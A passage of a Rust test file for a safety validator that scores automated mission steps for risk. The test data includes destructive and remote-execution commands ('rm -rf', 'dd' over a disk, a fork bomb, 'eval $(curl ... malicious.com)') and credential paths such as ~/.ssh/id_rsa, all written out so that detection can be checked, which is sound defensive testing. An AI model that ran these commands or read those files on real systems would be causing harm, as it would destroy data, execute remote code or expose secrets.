            version: "1.0".to_string(),
            steps: vec![
                // Safe step
                MissionStep {
                    id: "safe_step".to_string(),
                    name: "Safe operation".to_string(),
                    step_type: StepType::CreateFile,
                    parameters: json!({
                        "path": "/tmp/output.txt",
                        "content": "Hello World"
                    }),
                    timeout_seconds: Some(30),
                    continue_on_error: None,
                    depends_on: None,
                },
                // Risky HTTP step
                MissionStep {
                    id: "http_step".to_string(),
                    name: "HTTP request".to_string(),
                    step_type: StepType::Http,
                    parameters: json!({
                        "url": "http://api.example.com/data",
                        "method": "GET"
                    }),
                    timeout_seconds: Some(60),
                    continue_on_error: None,
                    depends_on: Some(vec!["safe_step".to_string()]),
                },
                // Dangerous command step
                MissionStep {
                    id: "dangerous_step".to_string(),
                    name: "System command".to_string(),
                    step_type: StepType::Command,
                    parameters: json!({
                        "command": "sudo rm -rf /tmp/important_data"
                    }),
                    timeout_seconds: Some(10),
                    continue_on_error: None,
                    depends_on: Some(vec!["http_step".to_string()]),
                },
            ],
            config: None,
        };

        let result = validator
            .validate_mission(&complex_mission, ValidationMode::Standard)
            .unwrap();

        // Should not be safe due to dangerous command
        assert!(!result.is_safe || result.risk_score > 30);

        // Should have issues
        assert!(!result.issues.is_empty());

        // Should detect the dangerous command
        assert!(result.issues.iter().any(|i| i.message.contains("sudo")
            || i.message.contains("rm -rf")
            || i.message.contains("Dangerous command")));

        // Should have correct metadata
        assert_eq!(result.metadata.get("total_steps"), Some(&"3".to_string()));
        assert_eq!(
            result.metadata.get("validation_mode"),
            Some(&"Standard".to_string())
        );
    }

    // ===== NEW COMPREHENSIVE TESTS FOR ENHANCED COVERAGE =====

    #[test]
    fn test_dangerous_command_edge_cases() {
        // Test case insensitive detection
        assert!(SafetyValidator::is_dangerous_command("RM -RF /"));
        assert!(SafetyValidator::is_dangerous_command(
            "SUDO apt-get install"
        ));
        assert!(SafetyValidator::is_dangerous_command("Chmod 777 /etc"));

        // Test dangerous commands with parameters
        assert!(SafetyValidator::is_dangerous_command("sudo -i"));
        assert!(SafetyValidator::is_dangerous_command("su - root"));
        assert!(SafetyValidator::is_dangerous_command("mkfs.ext4 /dev/sda1"));
        assert!(SafetyValidator::is_dangerous_command(
            "dd if=/dev/zero of=/dev/sda"
        ));
        assert!(SafetyValidator::is_dangerous_command("format c:"));

        // Test command injection patterns (these match the exact patterns in is_dangerous_command)
        assert!(SafetyValidator::is_dangerous_command(
            "some command curl | sh"
        ));
        assert!(SafetyValidator::is_dangerous_command("something wget | sh"));
        assert!(SafetyValidator::is_dangerous_command(
            "eval $(curl -s http://malicious.com/cmd)"
        ));

        // Test fork bomb detection
        assert!(SafetyValidator::is_dangerous_command(":(){:|:&};:"));

        // Test commands that should NOT be flagged
        assert!(!SafetyValidator::is_dangerous_command("ls -la /tmp"));
        assert!(!SafetyValidator::is_dangerous_command(
            "mkdir /tmp/safe_dir"
        ));
        assert!(!SafetyValidator::is_dangerous_command(
            "cp file1.txt file2.txt"
        ));
        assert!(!SafetyValidator::is_dangerous_command(
            "apt list --installed"
        )); // No sudo
        assert!(!SafetyValidator::is_dangerous_command(
            "rm /tmp/safe_file.txt"
        )); // Not rm -rf
        assert!(!SafetyValidator::is_dangerous_command(
            "chmod 644 /tmp/file.txt"
        )); // Not 777
        assert!(!SafetyValidator::is_dangerous_command(
            "curl -o output.txt http://api.com"
        )); // No pipe to sh
        assert!(!SafetyValidator::is_dangerous_command(
            "curl | grep something"
        )); // Pipe but not to sh
    }

    #[test]
    fn test_critical_path_edge_cases() {
        // Test Linux system paths
        assert!(SafetyValidator::is_critical_path("/etc/shadow"));
        assert!(SafetyValidator::is_critical_path("/bin/sh"));
        assert!(SafetyValidator::is_critical_path("/sbin/init"));
        assert!(SafetyValidator::is_critical_path("/usr/bin/sudo"));
        assert!(SafetyValidator::is_critical_path("/usr/sbin/sshd"));
        assert!(SafetyValidator::is_critical_path("/boot/vmlinuz"));
        assert!(SafetyValidator::is_critical_path("/lib/libc.so"));
        assert!(SafetyValidator::is_critical_path(
            "/lib64/ld-linux-x86-64.so"
        ));
        assert!(SafetyValidator::is_critical_path("/sys/kernel/debug"));
        assert!(SafetyValidator::is_critical_path("/proc/sys/kernel"));

        // Test Windows system paths
        assert!(SafetyValidator::is_critical_path(
            "C:\\Windows\\System32\\kernel32.dll"
        ));
        assert!(SafetyValidator::is_critical_path(
            "C:\\Program Files\\Important App"
        ));

        // Test user credential paths
        assert!(SafetyValidator::is_critical_path("~/.ssh/id_rsa"));
        assert!(SafetyValidator::is_critical_path("~/.aws/credentials"));

        // Test paths that should NOT be flagged
        assert!(!SafetyValidator::is_critical_path("/tmp/user_data.txt"));
        assert!(!SafetyValidator::is_critical_path(
            "/home/user/documents/file.pdf"
        ));
        assert!(!SafetyValidator::is_critical_path("/var/log/app.log"));
        assert!(!SafetyValidator::is_critical_path("/opt/myapp/config.json"));
        assert!(!SafetyValidator::is_critical_path(
            "./relative/path/file.txt"
        ));
        assert!(!SafetyValidator::is_critical_path("../parent/file.txt"));
        assert!(!SafetyValidator::is_critical_path("D:\\MyData\\file.txt"));
    }

    #[test]
    fn test_safe_url_edge_cases() {
        // Test HTTPS URLs (should be safe)
        assert!(SafetyValidator::is_safe_url("https://api.github.com/repos"));
        assert!(SafetyValidator::is_safe_url("https://www.google.com"));
        assert!(SafetyValidator::is_safe_url(
            "https://secure-api.example.com/v1/data"
        ));

        // Test localhost variations (should be safe)
        assert!(SafetyValidator::is_safe_url("http://localhost"));
        assert!(SafetyValidator::is_safe_url("http://localhost:3000"));
        assert!(SafetyValidator::is_safe_url("http://localhost:8080/api"));
        assert!(SafetyValidator::is_safe_url("https://localhost:443"));

        // Test loopback IP (should be safe)
        assert!(SafetyValidator::is_safe_url("http://127.0.0.1"));
        assert!(SafetyValidator::is_safe_url("http://127.0.0.1:8080"));
        assert!(SafetyValidator::is_safe_url("https://127.0.0.1:443/secure"));

        // Test private IP ranges (should be safe)
        assert!(SafetyValidator::is_safe_url("https://192.168.1.100"));
        assert!(SafetyValidator::is_safe_url("https://192.168.255.255/api"));
        assert!(SafetyValidator::is_safe_url("https://10.0.0.1"));
        assert!(SafetyValidator::is_safe_url("https://10.255.255.255/data"));
        assert!(SafetyValidator::is_safe_url("https://172.16.0.1"));
        assert!(SafetyValidator::is_safe_url("https://172.31.255.255/api"));

        // Test HTTP URLs to external domains (should be unsafe)
        assert!(!SafetyValidator::is_safe_url("http://external-api.com"));
        assert!(!SafetyValidator::is_safe_url(
            "http://malicious-site.net/payload"
        ));
        // Note: Private IPs are considered safe even with HTTP
        assert!(SafetyValidator::is_safe_url("http://192.168.1.100"));

        // Test non-HTTP(S) schemes (should be unsafe)
        assert!(!SafetyValidator::is_safe_url("ftp://example.com/file.zip"));
        assert!(!SafetyValidator::is_safe_url("ssh://user@server.com"));
        assert!(!SafetyValidator::is_safe_url("file:///etc/passwd"));
        assert!(!SafetyValidator::is_safe_url("javascript:alert('xss')"));
    }

    #[test]
    fn test_risk_score_accumulation() {
        let validator = SafetyValidator::new();

        // Mission with multiple risk factors
        let high_risk_mission = Mission {
            name: "high_risk_mission".to_string(),
            description: Some("Mission with multiple risk factors".to_string()),
            version: "1.0".to_string(),
            steps: vec![
                // Dangerous command (+30)
                MissionStep {
                    id: "dangerous_cmd".to_string(),
                    name: "Dangerous command".to_string(),
                    step_type: StepType::Command,
                    parameters: json!({"command": "rm -rf /tmp/data"}),
                    timeout_seconds: None,
                    continue_on_error: None, // Missing timeout (+5 in strict mode)
                    depends_on: None,
                },
                // Critical path deletion (+50)
                MissionStep {
                    id: "critical_delete".to_string(),
                    name: "Delete critical file".to_string(),
                    step_type: StepType::DeleteFile,
                    parameters: json!({"path": "/etc/hosts"}),
                    timeout_seconds: None,
                    continue_on_error: None, // Missing timeout (+5 in strict mode)
                    depends_on: None,
                },
                // Unsafe URL (+15)
                MissionStep {
                    id: "unsafe_http".to_string(),
                    name: "Unsafe HTTP request".to_string(),
                    step_type: StepType::Http,
                    parameters: json!({"url": "http://suspicious-domain.com"}),
                    timeout_seconds: None,
                    continue_on_error: None, // Missing timeout (+5 in strict mode)
                    depends_on: None,
                },
            ],
            config: None,
        };

        let result = validator
            .validate_mission(&high_risk_mission, ValidationMode::Standard)
            .unwrap();

        // Total expected risk: 30 + 50 + 15 = 95
        assert!(result.risk_score >= 90); // Allow some tolerance
        assert!(!result.is_safe); // Should exceed Standard mode threshold of 50
        assert!(result.issues.len() >= 3); // Should have at least 3 issues

        // Test in Strict mode (adds timeout penalties)
        let strict_result = validator
            .validate_mission(&high_risk_mission, ValidationMode::Strict)
            .unwrap();

        // Should have additional timeout penalties (3 * 5 = 15)
        assert!(strict_result.risk_score >= result.risk_score + 10); // Allow tolerance
        assert!(!strict_result.is_safe); // Should definitely fail strict mode
        assert!(strict_result.issues.len() >= 6); // Original 3 + 3 timeout issues
    }

    #[test]
    fn test_validation_mode_thresholds() {
        let validator = SafetyValidator::new();

        // Create a mission with exactly 25 risk score (1 unsafe URL + missing timeout in strict)
        let medium_risk_mission = Mission {
            name: "medium_risk".to_string(),
            description: None,
            version: "1.0".to_string(),
            steps: vec![
                MissionStep {
                    id: "medium_risk_step".to_string(),
                    name: "Medium risk HTTP".to_string(),
                    step_type: StepType::Http,
                    parameters: json!({"url": "http://api.example.com"}),
                    timeout_seconds: None,
                    continue_on_error: None, // +5 in strict mode
                    depends_on: None,
                },
                MissionStep {
                    id: "medium_risk_step2".to_string(),
                    name: "Another HTTP".to_string(),
                    step_type: StepType::Http,
                    parameters: json!({"url": "http://another-api.com"}),
                    timeout_seconds: Some(30),
                    continue_on_error: None, // No timeout penalty
                    depends_on: None,
                },
            ],
            config: None,
        };

        // Permissive mode (threshold < 80)
        let permissive_result = validator
            .validate_mission(&medium_risk_mission, ValidationMode::Permissive)
            .unwrap();
        assert!(permissive_result.is_safe); // Should pass with ~30 risk score

        // Standard mode (threshold < 50)
        let standard_result = validator
            .validate_mission(&medium_risk_mission, ValidationMode::Standard)
            .unwrap();
        assert!(standard_result.is_safe); // Should pass with ~30 risk score

        // Strict mode (threshold < 20 AND no critical issues)
        let strict_result = validator
            .validate_mission(&medium_risk_mission, ValidationMode::Strict)
            .unwrap();
        // Should fail due to risk score > 20 (30 base + 5 timeout penalty)
        assert!(!strict_result.is_safe || strict_result.risk_score >= 20);
    }

    #[test]
    fn test_safety_rule_validation_method() {
        let rule = SafetyRule {
            id: "test_rule".to_string(),
            name: "Test Rule".to_string(),
            description: "A test rule".to_string(),
            severity: IssueSeverity::Warning,
            applies_to: vec!["command".to_string()],
        };

        let mission = create_test_mission();

        // Test the validate method with actual logic
        let result = rule.validate(&mission, &ValidationMode::Standard);

        assert_eq!(result.rule_id, "test_rule");
        // Since this is a test rule with no specific logic, it should pass
        assert!(result.passed);
        assert!(result.issue.is_none());
        assert_eq!(result.risk_contribution, 0);
    }

    #[test]
    fn test_mission_with_no_applicable_steps() {
        let validator = SafetyValidator::new();

        // Mission with step types that don't match any safety rules
        let mission = Mission {
            name: "safe_mission".to_string(),
            description: None,
            version: "1.0".to_string(),
            steps: vec![MissionStep {
                id: "noop".to_string(),
                name: "No operation".to_string(),
                step_type: StepType::Noop,
                parameters: json!({}),
                timeout_seconds: Some(10),
                continue_on_error: None,
                depends_on: None,
            }],
            config: None,
        };

        let result = validator
            .validate_mission(&mission, ValidationMode::Standard)
            .unwrap();

        assert!(result.is_safe);
        assert_eq!(result.risk_score, 0);
        assert!(result.issues.is_empty());
        assert_eq!(result.metadata.get("total_steps"), Some(&"1".to_string()));
    }

    #[test]
    fn test_step_type_matching_in_rules() {
        let rule = SafetyRule {
            id: "specific_rule".to_string(),
            name: "Specific Rule".to_string(),
            description: "Applies only to HTTP steps".to_string(),
            severity: IssueSeverity::Info,
            applies_to: vec!["http".to_string()],
        };

        // Mission with HTTP step
        let http_mission = Mission {
            name: "http_test".to_string(),
            description: None,
            version: "1.0".to_string(),
            steps: vec![MissionStep {
                id: "http_step".to_string(),
                name: "HTTP request".to_string(),
                step_type: StepType::Http,
                parameters: json!({"url": "https://api.com"}),
                timeout_seconds: Some(30),
                continue_on_error: None,
                depends_on: None,
            }],
            config: None,
        };

        // Mission with non-HTTP step
        let file_mission = Mission {
            name: "file_test".to_string(),
            description: None,
            version: "1.0".to_string(),
            steps: vec![MissionStep {
                id: "file_step".to_string(),
                name: "Create file".to_string(),
                step_type: StepType::CreateFile,
                parameters: json!({"path": "/tmp/test.txt", "content": "test"}),
                timeout_seconds: Some(30),
                continue_on_error: None,
                depends_on: None,
            }],
            config: None,
        };

        assert!(rule.applies_to_mission(&http_mission));
        assert!(!rule.applies_to_mission(&file_mission));
    }

    #[test]
    fn test_step_parameters_missing_or_invalid() {
        let validator = SafetyValidator::new();

        // Test Command step with missing command parameter
        let missing_cmd_mission = Mission {
            name: "missing_cmd".to_string(),
            description: None,
            version: "1.0".to_string(),
            steps: vec![MissionStep {
                id: "bad_cmd".to_string(),
                name: "Command without command parameter".to_string(),
                step_type: StepType::Command,
                parameters: json!({"args": ["--help"]}), // Missing "command"
                timeout_seconds: Some(30),
                continue_on_error: None,
                depends_on: None,
            }],
            config: None,
        };

        // Test DeleteFile step with missing path parameter
        let missing_path_mission = Mission {
            name: "missing_path".to_string(),
            description: None,
            version: "1.0".to_string(),
            steps: vec![MissionStep {
                id: "bad_delete".to_string(),
                name: "Delete without path parameter".to_string(),
                step_type: StepType::DeleteFile,
                parameters: json!({"force": true}), // Missing "path"
                timeout_seconds: Some(30),
                continue_on_error: None,
                depends_on: None,
            }],
            config: None,
        };

        // Test HTTP step with missing URL parameter
        let missing_url_mission = Mission {
            name: "missing_url".to_string(),
            description: None,
            version: "1.0".to_string(),
            steps: vec![MissionStep {
                id: "bad_http".to_string(),
                name: "HTTP without URL parameter".to_string(),
                step_type: StepType::Http,
                parameters: json!({"method": "GET"}), // Missing "url"
                timeout_seconds: Some(30),
                continue_on_error: None,
                depends_on: None,
            }],
            config: None,
        };

        // These should all pass validation (no errors thrown for missing params)
        // The safety validator handles missing parameters gracefully
        let result1 = validator
            .validate_mission(&missing_cmd_mission, ValidationMode::Standard)
            .unwrap();
        let result2 = validator
            .validate_mission(&missing_path_mission, ValidationMode::Standard)
            .unwrap();
        let result3 = validator
            .validate_mission(&missing_url_mission, ValidationMode::Standard)
            .unwrap();

        // Should all be safe since no dangerous patterns detected
        assert!(result1.is_safe);
        assert!(result2.is_safe);
        assert!(result3.is_safe);
    }

    #[test]
    fn test_metadata_population() {
        let validator = SafetyValidator::new();
        let mission = create_test_mission();

        let result = validator
            .validate_mission(&mission, ValidationMode::Strict)
            .unwrap();

        // Test all expected metadata fields
        assert!(result.metadata.contains_key("total_steps"));
        assert!(result.metadata.contains_key("validation_mode"));
        assert!(result.metadata.contains_key("rules_applied"));

        assert_eq!(result.metadata.get("total_steps"), Some(&"1".to_string()));
        assert_eq!(
            result.metadata.get("validation_mode"),
            Some(&"Strict".to_string())
        );
        assert!(
            result
                .metadata
                .get("rules_applied")
                .unwrap()
                .parse::<usize>()
                .unwrap()
                > 0
        );
    }

    #[test]
    fn test_safety_issue_with_all_fields() {
        let issue = SafetyIssue {
            severity: IssueSeverity::Critical,
            message: "Critical security violation detected".to_string(),
            step_id: Some("vulnerable_step".to_string()),
            rule_id: Some("security_rule_001".to_string()),
        };

        assert!(matches!(issue.severity, IssueSeverity::Critical));
        assert_eq!(issue.message, "Critical security violation detected");
        assert_eq!(issue.step_id.as_ref().unwrap(), "vulnerable_step");
        assert_eq!(issue.rule_id.as_ref().unwrap(), "security_rule_001");

        // Test serialization/deserialization
        let serialized = serde_json::to_string(&issue).unwrap();
        let deserialized: SafetyIssue = serde_json::from_str(&serialized).unwrap();

        assert!(matches!(deserialized.severity, IssueSeverity::Critical));
        assert_eq!(deserialized.message, issue.message);
        assert_eq!(deserialized.step_id, issue.step_id);
        assert_eq!(deserialized.rule_id, issue.rule_id);
    }

    #[test]
    fn test_safety_issue_with_minimal_fields() {
        let issue = SafetyIssue {
            severity: IssueSeverity::Info,
            message: "Informational message".to_string(),
            step_id: None,
            rule_id: None,
        };

        assert!(matches!(issue.severity, IssueSeverity::Info));
        assert_eq!(issue.message, "Informational message");
        assert!(issue.step_id.is_none());
        assert!(issue.rule_id.is_none());
    }

    #[test]
    fn test_concurrent_validation() {
        use std::sync::Arc;
        use std::thread;

        let validator = Arc::new(SafetyValidator::new());
        let mission = Arc::new(create_dangerous_mission());

        // Test concurrent access to validator
        let handles: Vec<_> = (0..10)
            .map(|i| {
                let validator = Arc::clone(&validator);
                let mission = Arc::clone(&mission);

                thread::spawn(move || {
                    let mode = match i % 3 {
                        0 => ValidationMode::Permissive,
                        1 => ValidationMode::Standard,
                        _ => ValidationMode::Strict,
                    };

                    validator.validate_mission(&mission, mode)
                })
            })
            .collect();

        // Collect all results
        let results: Vec<_> = handles.into_iter().map(|h| h.join().unwrap()).collect();

        // All validations should succeed (no panics or errors)
        assert_eq!(results.len(), 10);
        for result in results {
            assert!(result.is_ok());
            let validation_result = result.unwrap();
            // All should detect the dangerous mission
            assert!(!validation_result.is_safe || !validation_result.issues.is_empty());
        }
    }
}
